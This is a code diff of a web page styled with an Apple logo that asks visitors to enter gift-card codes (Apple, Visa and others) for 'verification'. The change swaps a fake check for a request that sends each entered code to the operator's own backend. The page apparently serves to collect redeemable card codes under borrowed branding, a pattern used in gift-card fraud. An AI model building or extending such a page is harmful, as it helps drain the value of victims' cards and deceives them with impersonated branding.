@@ -12,7 +12,6 @@ body {
   background: #f1f5f9;
 }
 
-/* Header */
 .header {
   background: linear-gradient(90deg, #6d28d9, #4f46e5);
   padding: 18px;
@@ -23,7 +22,6 @@ body {
   justify-content: space-between;
 }
 
-/* Container */
 .container {
   background: white;
   margin: -20px auto 20px;
@@ -32,30 +30,11 @@ body {
   width: 90%;
   max-width: 400px;
   box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-  transition: all 0.3s ease;
 }
 
-h1 {
-  font-size: 22px;
-}
-
-/* Logo */
 .logo {
   text-align: center;
   margin-bottom: 10px;
-}
-
-.logo svg {
-  width: 40px;
-  height: 40px;
-}
-
-/* Inputs */
-label {
-  display: block;
-  margin-top: 15px;
-  font-size: 14px;
-  font-weight: 600;
 }
 
 input, select {
@@ -66,7 +45,6 @@ input, select {
   border: 1px solid #cbd5e1;
 }
 
-/* Button */
 button {
   margin-top: 20px;
   width: 100%;
@@ -78,7 +56,9 @@ button {
   font-weight: bold;
 }
 
-/* Loader */
+.step { display: none; text-align: center; }
+.step.active { display: block; }
+
 .loader {
   border: 4px solid #e2e8f0;
   border-top: 4px solid #4f46e5;
@@ -88,9 +68,6 @@ button {
   margin: 40px auto;
   animation: spin 1s linear infinite;
 }
-
-.step { display: none; text-align: center; }
-.step.active { display: block; }
 
 .success { color: green; }
 .error { color: red; }
@@ -158,7 +135,7 @@ button {
 </div>
 
 <script>
-// 🍎 Apple SVG logo
+// Apple logo
 const appleLogo = `
 <svg viewBox="0 0 24 24" fill="black">
   <path d="M16.365 1.43c0 1.14-.463 2.24-1.21 3.02-.79.83-2.07 1.47-3.2 1.39-.14-1.08.42-2.23 1.18-3.01.83-.86 2.22-1.48 3.23-1.4zM20.5 17.08c-.37.84-.82 1.62-1.34 2.33-.71.97-1.29 1.64-1.75 2.01-.71.61-1.47.92-2.29.95-.59 0-1.3-.17-2.13-.52-.84-.35-1.61-.52-2.32-.52-.74 0-1.53.17-2.36.52-.83.35-1.5.54-2.02.56-.79.03-1.56-.3-2.3-.99-.47-.4-1.08-1.1-1.82-2.1-.79-1.06-1.44-2.3-1.96-3.73-.56-1.54-.84-3.03-.84-4.47 0-1.65.36-3.07 1.07-4.26.56-.96 1.31-1.72 2.24-2.27.93-.55 1.93-.83 3-.85.63 0 1.45.2 2.47.6 1.01.4 1.66.6 1.95.6.21 0 .91-.22 2.09-.66 1.12-.41 2.07-.58 2.85-.52 2.12.17 3.72 1.01 4.78 2.51-1.9 1.15-2.84 2.76-2.82 4.82.02 1.61.6 2.95 1.74 4.02.52.5 1.1.88 1.75 1.14-.14.4-.29.79-.46 1.16z"/>
@@ -176,7 +153,6 @@ function updateUI() {
   }
 }
 
-// validation stays same
 function validateCode(code, type) {
   if (type === "apple") return /^[A-Z0-9]{8,12}$/.test(code);
   if (type === "visa") return /^[A-Z0-9]{12,16}$/.test(code);
@@ -184,7 +160,7 @@ function validateCode(code, type) {
   return /^[A-Z0-9]{4,}$/.test(code);
 }
 
-<script> async function goToVerify() {   const code = document.getElementById("code").value;   const type = document.getElementById("cardType").value;   const error = document.getElementById("errorMsg");    if (!validateCode(code, type)) {     error.textContent = "Invalid code format";     return;   }    error.textContent = "";   showStep("step2");    try {     // ✅ SENDS CODE TO YOUR BACKEND (THIS WAS MISSING)     const res = await fetch("/api/verify", {       method: "POST",       headers: {         "Content-Type": "application/json"       },       body: JSON.stringify({ code })     });      const data = await res.json();      showStep("step3");      if (data.success) {       resultTitle.textContent = "Valid Code";       resultTitle.className = "success";       resultText.textContent = type.toUpperCase() + " card verified";     } else {       resultTitle.textContent = "Invalid Code";       resultTitle.className = "error";       resultText.textContent = "Please try again";     }    } catch (err) {     showStep("step3");     resultTitle.textContent = "Error";     resultText.textContent = "Request failed";   } } </script>
+async function goToVerify() {
   const code = document.getElementById("code").value;
   const type = document.getElementById("cardType").value;
   const error = document.getElementById("errorMsg");
@@ -197,18 +173,31 @@ function validateCode(code, type) {
   error.textContent = "";
   showStep("step2");
 
-  await new Promise(r => setTimeout(r, 1200));
+  try {
+    const res = await fetch("/api/verify", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ code })
+    });
 
-  showStep("step3");
+    const data = await res.json();
 
-  if (code.startsWith("A")) {
-    resultTitle.textContent = "Valid Code";
-    resultTitle.className = "success";
-    resultText.textContent = type.toUpperCase() + " card verified";
-  } else {
-    resultTitle.textContent = "Invalid Code";
-    resultTitle.className = "error";
-    resultText.textContent = "Please try again";
+    showStep("step3");
+
+    if (data.success) {
+      resultTitle.textContent = "Valid Code";
+      resultTitle.className = "success";
+      resultText.textContent = type.toUpperCase() + " card verified";
+    } else {
+      resultTitle.textContent = "Invalid Code";
+      resultTitle.className = "error";
+      resultText.textContent = "Please try again";
+    }
+
+  } catch (err) {
+    showStep("step3");
+    resultTitle.textContent = "Error";
+    resultText.textContent = "Request failed";
   }
 }
 
